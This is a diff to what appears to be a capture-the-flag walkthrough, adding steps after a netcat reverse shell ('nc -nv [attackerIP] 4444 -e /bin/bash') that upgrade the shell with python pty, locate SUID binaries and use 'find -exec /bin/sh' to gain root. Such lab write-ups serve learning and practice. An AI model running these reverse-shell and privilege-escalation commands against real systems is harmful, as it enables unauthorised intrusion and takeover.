@@ -75,7 +75,12 @@ go back to "Dashboard" > in search box type "navigation" then click search > cli
 back to terminal > establish netcat listener "nc -lvp 4444" > back to browser type > nc -nv [attackerIP] 4444 -e /bin/bash > back to terminal
 
 # Use python script to establish shell then find any binaries with SUID
-in terminal type > python -c 'import pty; pty.spawn("/bin/bash")' > you'll get into $ > now for finding bins > find /-perm /4000
+in terminal type > python -c 'import pty; pty.spawn("/bin/bash")' > you'll get into $ > now for finding bins type > find /-perm /4000 > result shows bins with SUID permission
+
+# Use find command since it has SUID, should get you that juicy root access
+find . -exec '/bin/sh' \; > use ls and cd till you find that flag.txt
+
+===================================================================================
 
 
 
